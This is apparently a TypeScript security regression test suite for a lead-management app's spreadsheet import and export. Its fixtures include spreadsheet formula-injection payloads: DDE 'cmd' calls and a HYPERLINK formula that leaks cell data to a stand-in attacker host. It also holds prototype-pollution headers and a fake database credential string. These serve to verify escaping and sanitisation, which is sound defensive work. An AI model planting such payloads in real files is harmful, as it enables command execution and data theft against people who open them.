/**
 * HEEYAKU Stage 4.6 — XLSX Remediation & Comprehensive Regression Suite
 *
 * This test suite validates:
 * 1. Safe parsing of valid XLSX and CSV files with ExcelJS and PapaParse.
 * 2. Rejection of malformed, corrupted, and oversized spreadsheets (>25,000 rows).
 * 3. Handling of missing, duplicated, and unexpected headers.
 * 4. Prototype-pollution prevention: `__proto__`, `constructor`, `prototype` headers and row objects.
 * 5. Formula injection mitigation (CWE-1236) on lead export: escaping `=, +, -, @, \t, \r`.
 * 6. Lead export engine: binary XLSX generation via ExcelJS and CSV streaming via PapaParse.
 * 7. Two-phase lead import preview and validation (format, phone normalization, deduplication).
 * 8. Error sanitization (CWE-209): ensuring zero stack traces or internal secrets leak.
 */

import ExcelJS from 'exceljs';
import Papa from 'papaparse';
import {
  parseImportFile,
  parseImportCsvText,
  autoDetectColumnMapping,
  runWithPrototypeGuard,
} from '../lib/lead/import-parser';
import { formatLeadsForExport, LeadExportData } from '../lib/lead/export';
import { sanitizeErrorMessage } from '../lib/security/errors';
import { normalizePhoneNumber, zodPhoneNumberSchema } from '../lib/lead/phone';

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function assert(condition: boolean, title: string, detail?: string) {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log(`  ✅ [PASS] ${title}`);
  } else {
    failedTests++;
    console.error(`  ❌ [FAIL] ${title} ${detail ? `(${detail})` : ''}`);
  }
}

async function assertThrowsAsync(
  fn: () => Promise<unknown>,
  expectedErrorSubstring: string,
  title: string
) {
  totalTests++;
  try {
    await fn();
    failedTests++;
    console.error(`  ❌ [FAIL] ${title} (Expected function to throw, but it succeeded)`);
  } catch (err: any) {
    const msg = err?.message || String(err);
    if (msg.includes(expectedErrorSubstring)) {
      passedTests++;
      console.log(`  ✅ [PASS] ${title} (Correctly rejected: "${msg}")`);
    } else {
      failedTests++;
      console.error(`  ❌ [FAIL] ${title} (Expected error containing "${expectedErrorSubstring}", got "${msg}")`);
    }
  }
}

function toFile(content: unknown, name: string, type: string): File {
  return new File([content as unknown as BlobPart], name, { type });
}

async function createMockXlsxBuffer(
  rows: Array<Record<string, any>>,
  sheetName = 'Sheet1'
): Promise<Uint8Array> {
  const workbook = new ExcelJS.Workbook();
  const worksheet = workbook.addWorksheet(sheetName);

  if (rows.length > 0) {
    const headers = Object.keys(rows[0]);
    worksheet.columns = headers.map((key) => ({
      header: key,
      key,
      width: 15,
    }));

    for (const row of rows) {
      worksheet.addRow(row);
    }
  }

  const buffer = await workbook.xlsx.writeBuffer();
  return new Uint8Array(buffer);
}

async function runXlsxRemediationSuite() {
  console.log('======================================================================');
  console.log('🛡️  HEEYAKU STAGE 4.6 — XLSX REMEDIATION & SECURITY REGRESSION SUITE');
  console.log('======================================================================\n');

  // ---------------------------------------------------------------------------
  // SUITE 1: Valid XLSX Parsing & Structure
  // ---------------------------------------------------------------------------
  console.log('----------------------------------------------------------------------');
  console.log('📁 SUITE 1: Valid XLSX Ingestion via ExcelJS');
  console.log('----------------------------------------------------------------------');

  const validData = [
    { Name: 'Priya Sharma', Phone: '9876543210', Email: 'priya@example.com', Course: 'Computer Science' },
    { Name: 'Amit Verma', Phone: '9876543211', Email: 'amit@example.com', Course: 'Data Science' },
  ];
  const validXlsxBuffer = await createMockXlsxBuffer(validData);
  const validXlsxFile = toFile(validXlsxBuffer, 'leads.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');

  const parsedXlsx = await parseImportFile(validXlsxFile);
  assert(parsedXlsx.headers.length === 4, 'Suite 1.1: Correctly parsed 4 column headers from XLSX');
  assert(parsedXlsx.rows.length === 2, 'Suite 1.2: Correctly parsed 2 lead rows from XLSX');
  assert(parsedXlsx.rows[0].Name === 'Priya Sharma', 'Suite 1.3: Accurately read cell values in XLSX');
  assert(parsedXlsx.rows[1].Phone === '9876543211', 'Suite 1.4: Accurately read numerical phone values as strings');

  // ---------------------------------------------------------------------------
  // SUITE 2: Valid CSV Ingestion via PapaParse
  // ---------------------------------------------------------------------------
  console.log('\n----------------------------------------------------------------------');
  console.log('📁 SUITE 2: Valid CSV Ingestion via PapaParse');
  console.log('----------------------------------------------------------------------');

  const validCsvContent = 'Name,Phone,Email,Course\nRahul Sen,9876543212,rahul@example.com,AI & ML\nNeha Patel,9876543213,neha@example.com,Cybersecurity';
  const validCsvFile = toFile(validCsvContent, 'leads.csv', 'text/csv');

  const parsedCsv = await parseImportFile(validCsvFile);
  assert(parsedCsv.headers.length === 4, 'Suite 2.1: Correctly parsed CSV headers');
  assert(parsedCsv.rows.length === 2, 'Suite 2.2: Correctly parsed 2 CSV rows');
  assert(parsedCsv.rows[0].Name === 'Rahul Sen', 'Suite 2.3: Correctly extracted first CSV row name');

  // Pasted CSV Text parsing
  const parsedPasted = parseImportCsvText(validCsvContent);
  assert(parsedPasted.rows.length === 2, 'Suite 2.4: parseImportCsvText successfully parses raw pasted clipboard string');

  // ---------------------------------------------------------------------------
  // SUITE 3: Malformed & Corrupted Spreadsheets
  // ---------------------------------------------------------------------------
  console.log('\n----------------------------------------------------------------------');
  console.log('📁 SUITE 3: Malformed, Corrupted, & Invalid Files');
  console.log('----------------------------------------------------------------------');

  const corruptedBuffer = new Uint8Array(Buffer.from('NOT_A_VALID_ZIP_OR_XLSX_HEADER_TRUNCATED_BYTES'));
  const corruptedFile = toFile(corruptedBuffer, 'corrupt.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');

  await assertThrowsAsync(
    () => parseImportFile(corruptedFile),
    'Unable to parse Excel workbook',
    'Suite 3.1: Corrupted binary XLSX is safely caught and returns user-friendly error'
  );

  const unsupportedFile = toFile('text content', 'document.pdf', 'application/pdf');
  await assertThrowsAsync(
    () => parseImportFile(unsupportedFile),
    'Unsupported file format',
    'Suite 3.2: Unsupported file extension is rejected with clear error'
  );

  const emptyWorkbook = new ExcelJS.Workbook();
  const emptyBuffer = new Uint8Array(await emptyWorkbook.xlsx.writeBuffer());
  const emptyFile = toFile(emptyBuffer, 'empty.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
  await assertThrowsAsync(
    () => parseImportFile(emptyFile),
    'Spreadsheet contains no sheets or is empty',
    'Suite 3.3: Empty Excel workbook without worksheets fails closed'
  );

  // ---------------------------------------------------------------------------
  // SUITE 4: Oversized Spreadsheets & Resource Capping
  // ---------------------------------------------------------------------------
  console.log('\n----------------------------------------------------------------------');
  console.log('📁 SUITE 4: Resource Capping & DoS Mitigation');
  console.log('----------------------------------------------------------------------');

  // Create an ExcelJS workbook that exceeds 25,000 rows
  const largeWorkbook = new ExcelJS.Workbook();
  const largeSheet = largeWorkbook.addWorksheet('MassiveSheet');
  largeSheet.columns = [{ header: 'Name', key: 'name' }, { header: 'Phone', key: 'phone' }];

  // Simulate row count > 25,000
  // Instead of building a massive 25k in-memory object, populate row 25001 directly
  largeSheet.getRow(25002).values = ['Overload Lead', '9999999999'];
  const largeBuffer = new Uint8Array(await largeWorkbook.xlsx.writeBuffer());
  const largeFile = toFile(largeBuffer, 'massive.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');

  await assertThrowsAsync(
    () => parseImportFile(largeFile),
    'exceeds maximum upload batch size of 25,000 rows',
    'Suite 4.1: Workbooks with >25,000 rows are blocked before processing'
  );

  // ---------------------------------------------------------------------------
  // SUITE 5: Missing, Duplicated, and Unusual Headers
  // ---------------------------------------------------------------------------
  console.log('\n----------------------------------------------------------------------');
  console.log('📁 SUITE 5: Missing, Duplicated, & Irregular Headers');
  console.log('----------------------------------------------------------------------');

  const irregularWorkbook = new ExcelJS.Workbook();
  const irregularSheet = irregularWorkbook.addWorksheet('Sheet1');
  // Row 1: Header with empty cell between headers and duplicate names
  irregularSheet.getRow(1).values = ['Name', '', 'Phone', 'Phone', 'Extra Column'];
  irregularSheet.getRow(2).values = ['John Doe', 'ignored', '9876543210', '9876543211', 'Extra Data'];

  const irregularBuffer = new Uint8Array(await irregularWorkbook.xlsx.writeBuffer());
  const irregularFile = toFile(irregularBuffer, 'irregular.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');

  const parsedIrregular = await parseImportFile(irregularFile);
  assert(parsedIrregular.headers.includes('Name'), 'Suite 5.1: Valid header extracted despite empty header neighbors');
  assert(parsedIrregular.headers.includes('Phone'), 'Suite 5.2: Duplicated header handled without throwing');
  assert(parsedIrregular.rows[0].Name === 'John Doe', 'Suite 5.3: Row data properly indexed to sanitized headers');

  // Auto-detection of column mappings
  const mapping = autoDetectColumnMapping(['Student Name', 'Mobile Number', 'Course / Batch', 'Remarks']);
  assert(mapping.nameCol === 'Student Name', 'Suite 5.4: autoDetectColumnMapping detects "Student Name" -> nameCol');
  assert(mapping.phoneCol === 'Mobile Number', 'Suite 5.5: autoDetectColumnMapping detects "Mobile Number" -> phoneCol');
  assert(mapping.companyCol === 'Course / Batch', 'Suite 5.6: autoDetectColumnMapping detects "Course / Batch" -> companyCol');
  assert(mapping.notesCol === 'Remarks', 'Suite 5.7: autoDetectColumnMapping detects "Remarks" -> notesCol');

  // ---------------------------------------------------------------------------
  // SUITE 6: Prototype Pollution Payloads
  // ---------------------------------------------------------------------------
  console.log('\n----------------------------------------------------------------------');
  console.log('📁 SUITE 6: Prototype Pollution Payload Neutralization');
  console.log('----------------------------------------------------------------------');

  const pollutionWorkbook = new ExcelJS.Workbook();
  const pollutionSheet = pollutionWorkbook.addWorksheet('Exploit');
  pollutionSheet.getRow(1).values = ['__proto__', 'constructor', 'prototype', 'NormalCol'];
  pollutionSheet.getRow(2).values = ['polluted_proto', 'polluted_constructor', 'polluted_prop', 'Safe Value'];

  const pollutionBuffer = new Uint8Array(await pollutionWorkbook.xlsx.writeBuffer());
  const pollutionFile = toFile(pollutionBuffer, 'exploit.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');

  const parsedPollution = await parseImportFile(pollutionFile);
  assert(!parsedPollution.headers.includes('__proto__'), 'Suite 6.1: Header "__proto__" is excluded from headers');
  assert(!parsedPollution.headers.includes('constructor'), 'Suite 6.2: Header "constructor" is excluded from headers');
  assert(!parsedPollution.headers.includes('prototype'), 'Suite 6.3: Header "prototype" is excluded from headers');
  assert(parsedPollution.headers.includes('NormalCol'), 'Suite 6.4: Legitimate headers remain intact');

  assert((Object.prototype as any).polluted_proto === undefined, 'Suite 6.5: Object.prototype was NOT polluted by spreadsheet');
  assert((Object.prototype as any).NormalCol === undefined, 'Suite 6.6: Clean object construction preserves prototype');

  // Verify runWithPrototypeGuard purges changes
  runWithPrototypeGuard(() => {
    (Object.prototype as any).testInjectedKey = 'injected';
  });
  assert((Object.prototype as any).testInjectedKey === undefined, 'Suite 6.7: runWithPrototypeGuard clears rogue prototype mutations');

  // ---------------------------------------------------------------------------
  // SUITE 7: Formula Injection Mitigation (CWE-1236) & Export Generation
  // ---------------------------------------------------------------------------
  console.log('\n----------------------------------------------------------------------');
  console.log('📁 SUITE 7: Formula Injection Defense (CWE-1236) & Export Engine');
  console.log('----------------------------------------------------------------------');

  const adversarialLeads: LeadExportData[] = [
    {
      leadCode: '=cmd|\' /C calc\'!A0',
      name: '+cmd|\' /C notepad\'!A0',
      phoneNumber: '-9876543210',
      email: '@sum(A1:A10)',
      company: '\tTabIndentedCourse',
      source: '\rCarriageReturnSource',
      status: 'NEW',
      createdAt: new Date('2026-01-01'),
      notes: '=HYPERLINK("http://attacker.com/leak?data="&A1,"Click Here")',
    },
    {
      leadCode: 'LEAD-1002',
      name: 'Safe Prospect',
      phoneNumber: '9876543211',
      email: 'safe@example.com',
      company: 'Standard School',
      source: 'Google Ads',
      status: 'ASSIGNED',
      createdAt: new Date('2026-01-02'),
      notes: 'Clean remarks without formula characters',
    },
  ];

  const formattedForExport = formatLeadsForExport(adversarialLeads);

  // Check formula escaping
  assert(formattedForExport[0]['Lead ID'].startsWith("'="), 'Suite 7.1: Leading = prepended with single quote');
  assert(formattedForExport[0]['Prospect Name'].startsWith("'+"), 'Suite 7.2: Leading + prepended with single quote');
  assert(formattedForExport[0]['Phone Number'].startsWith("'-"), 'Suite 7.3: Leading - prepended with single quote');
  assert(formattedForExport[0]['Email Address'].startsWith("'@"), 'Suite 7.4: Leading @ prepended with single quote');
  assert(formattedForExport[0]['Target Course / School'].startsWith("'\t"), 'Suite 7.5: Leading Tab prepended with single quote');
  assert(formattedForExport[0]['Lead Source'].startsWith("'\r"), 'Suite 7.6: Leading CR prepended with single quote');
  assert(formattedForExport[0]['Notes / Remarks'].startsWith("'="), 'Suite 7.7: Formula in remarks escaped');

  // Safe leads must not have single quote prepended
  assert(formattedForExport[1]['Lead ID'] === 'LEAD-1002', 'Suite 7.8: Safe lead ID left untouched');
  assert(formattedForExport[1]['Prospect Name'] === 'Safe Prospect', 'Suite 7.9: Safe name left untouched');

  // ExcelJS Export Generation Test
  const exportWorkbook = new ExcelJS.Workbook();
  const exportSheet = exportWorkbook.addWorksheet('HEEYAKU_Leads');
  const exportHeaders = Object.keys(formattedForExport[0]);
  exportSheet.columns = exportHeaders.map((h) => ({ header: h, key: h, width: 15 }));
  for (const row of formattedForExport) {
    exportSheet.addRow(row);
  }
  const exportBuffer = await exportWorkbook.xlsx.writeBuffer();
  assert(exportBuffer.byteLength > 500, 'Suite 7.10: ExcelJS generates valid XLSX binary buffer (>500 bytes)');

  // Verify exported buffer can be re-read and contains formula-neutralized values
  const rereadWorkbook = new ExcelJS.Workbook();
  await rereadWorkbook.xlsx.load(exportBuffer);
  const rereadSheet = rereadWorkbook.worksheets[0];
  const firstDataRow = rereadSheet.getRow(2);
  const cellVal = String(firstDataRow.getCell(1).value);
  assert(cellVal.startsWith("'="), 'Suite 7.11: Exported XLSX retains formula-neutralized escaping in binary payload');

  // PapaParse CSV Export Generation Test
  const csvExport = Papa.unparse(formattedForExport);
  assert(csvExport.includes("'=cmd"), 'Suite 7.12: CSV export output retains escaped formula string');
  assert(csvExport.includes('LEAD-1002'), 'Suite 7.13: CSV export contains second lead record');

  // ---------------------------------------------------------------------------
  // SUITE 8: Phone Normalization & Lead Validation Logic
  // ---------------------------------------------------------------------------
  console.log('\n----------------------------------------------------------------------');
  console.log('📁 SUITE 8: Phone Normalization & Input Validation Logic');
  console.log('----------------------------------------------------------------------');

  assert(normalizePhoneNumber('+91 98765 43210') === '9876543210', 'Suite 8.1: Normalizes +91 country code with spaces');
  assert(normalizePhoneNumber('09876543210') === '9876543210', 'Suite 8.2: Strips leading zero from 11-digit numbers');
  assert(normalizePhoneNumber('98765-43210') === '9876543210', 'Suite 8.3: Strips hyphens from phone numbers');

  const validPhoneResult = zodPhoneNumberSchema.safeParse('9876543210');
  assert(validPhoneResult.success === true, 'Suite 8.4: Valid 10-digit phone passes Zod validation');

  const invalidPhoneResult = zodPhoneNumberSchema.safeParse('12345');
  assert(invalidPhoneResult.success === false, 'Suite 8.5: Invalid 5-digit phone fails Zod validation');

  // ---------------------------------------------------------------------------
  // SUITE 9: Information Disclosure Sanitization (CWE-209)
  // ---------------------------------------------------------------------------
  console.log('\n----------------------------------------------------------------------');
  console.log('📁 SUITE 9: Error Sanitization (CWE-209)');
  console.log('----------------------------------------------------------------------');

  const prismaInternalError = new Error(
    'Invalid `prisma.lead.create()` invocation:\n' +
      'Unique constraint failed on the fields: (`phoneNumber`,`companyId`)\n' +
      'at /app/node_modules/@prisma/client/runtime/library.js:123:45\n' +
      'Postgres connection string: postgresql://postgres:secretpassword@130.210.23.195:5432/heeyaku'
  );

  const cleanPrismaMsg = sanitizeErrorMessage(prismaInternalError);
  assert(!cleanPrismaMsg.includes('secretpassword'), 'Suite 9.1: Sanitized error never reveals passwords');
  assert(!cleanPrismaMsg.includes('130.210.23.195'), 'Suite 9.2: Sanitized error never reveals database IP');
  assert(!cleanPrismaMsg.includes('/app/node_modules'), 'Suite 9.3: Sanitized error never reveals filesystem paths');
  assert(!cleanPrismaMsg.includes('runtime/library.js'), 'Suite 9.4: Sanitized error never reveals stack traces');

  console.log('\n======================================================================');
  console.log(`📊 XLSX & REGRESSION TEST RESULTS: ${passedTests}/${totalTests} PASSED (${failedTests} FAILED)`);
  console.log('======================================================================\n');

  if (failedTests > 0) {
    process.exit(1);
  }
}

runXlsxRemediationSuite().catch((err) => {
  console.error('Fatal unhandled error in test suite:', err);
  process.exit(1);
});
